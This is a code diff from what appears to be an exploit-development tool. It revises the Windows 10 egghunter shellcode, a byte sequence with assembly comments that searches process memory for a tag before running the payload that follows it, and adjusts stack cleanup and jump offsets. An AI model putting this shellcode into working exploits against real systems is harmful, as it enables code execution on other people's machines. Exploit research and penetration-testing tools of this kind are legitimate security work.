@@ -13690,30 +13690,36 @@ def main(args):
 					incedxoffset = 13 # The offset in the egghunter to reach the #INC EDX
 				elif win_ver == "10":
 					egghunter += (
-						"\x33\xD2"             #XOR EDX,EDX
-						"\x66\x81\xCA\xFF\x0F" #OR DX,0FFF
-						"\x33\xDB"             #XOR EBX,EBX
+					# _start:
+					    # "\x8c\xcb"            #MOV EBX,CS
+						# "\x80\xfb\x23"        #CMP BL,0x23
+						"\x33\xD2"              #XOR EDX,EDX
+					# invalid_page:
+						"\x66\x81\xCA\xFF\x0F"  #OR DX,0FFF
+					# valid_page:
+						"\x33\xDB"              #XOR EBX,EBX
 						"\x42"               	#INC EDX
+						"\x53"               	#PUSH EBX
+						"\x53"               	#PUSH EBX
 						"\x52"               	#PUSH EDX
-						"\x53"               	#PUSH EBX 
 						"\x53"               	#PUSH EBX
 						"\x53"               	#PUSH EBX
 						"\x53"               	#PUSH EBX
 						"\x6A\x29"            	#PUSH 29
 						"\x58"               	#POP EAX
 						"\xB3\xC0"            	#MOV BL,0C0
-						
-						"\x64\xFF\x13"         #CALL DWORD PTR FS:[EBX]
-						"\x83\xC4\x10"         #ADD ESP,0x10
+						"\x64\xFF\x13"          #CALL DWORD PTR FS:[EBX]
+						"\x83\xC4\x0c"          #ADD ESP,0xc
 						"\x5A"               	#POP EDX
+						"\x83\xc4\x08"          #ADD ESP,0x8
 						"\x3C\x05"            	#CMP AL,5
-						"\x74\xE3"            	#JE SHORT
+						"\x74\xDF"            	#JE SHORT invalid_page
 						"\xB8" + egg +  		#MOV EAX,<tag>
-						"\x8B\xFA"             #MOV EDI,EDX
+						"\x8B\xFA"              #MOV EDI,EDX
 						"\xAF"               	#SCAS DWORD PTR ES:[EDI]
-						"\x75\xDE"            	#JNZ SHORT
+						"\x75\xDA"            	#JNZ SHORT valid_page
 						"\xAF"              	#SCAS DWORD PTR ES:[EDI]
-						"\x75\xDB"    			#JNZ SHORT
+						"\x75\xD7"    			#JNZ SHORT valid_page
 						)
 					incedxoffset = 9 # The offset in the egghunter to reach the #INC EDX
 			if usechecksum:
